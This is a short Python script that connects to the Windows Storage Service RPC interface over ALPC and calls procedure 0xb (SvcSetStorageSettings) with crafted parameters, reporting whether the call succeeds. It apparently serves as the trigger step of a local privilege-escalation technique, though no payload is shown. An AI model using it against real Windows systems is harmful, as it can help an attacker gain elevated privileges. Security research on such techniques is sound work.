import sys
import ctypes
import windows.rpc
import windows.generated_def as gdef
from windows.rpc import ndr

StorSvc_UUID =  r"BE7F785E-0E3A-4AB7-91DE-7E46E443BE29"
		
class SvcSetStorageSettingsParameters(ndr.NdrParameters):
	MEMBERS = [ndr.NdrShort, ndr.NdrLong, ndr.NdrShort, ndr.NdrLong]
									
def SvcSetStorageSettings():
	print("[+] Connecting....")
	client = windows.rpc.find_alpc_endpoint_and_connect(StorSvc_UUID, (0,0))
	print("[+] Binding....")
	iid = client.bind(StorSvc_UUID, (0,0))
	params = SvcSetStorageSettingsParameters.pack([0, 1, 2, 0x77])
	print("[+] Calling SvcSetStorageSettings")
	result = client.call(iid, 0xb, params)
	if len(str(result)) > 0:
		print("   [*] Call executed successfully!")
		stream = ndr.NdrStream(result)
		res = ndr.NdrLong.unpack(stream)
		if res == 0:
			print("   [*] Success")
		else:
			print("   [*] Failed")
		
if __name__ == "__main__":
	SvcSetStorageSettings()
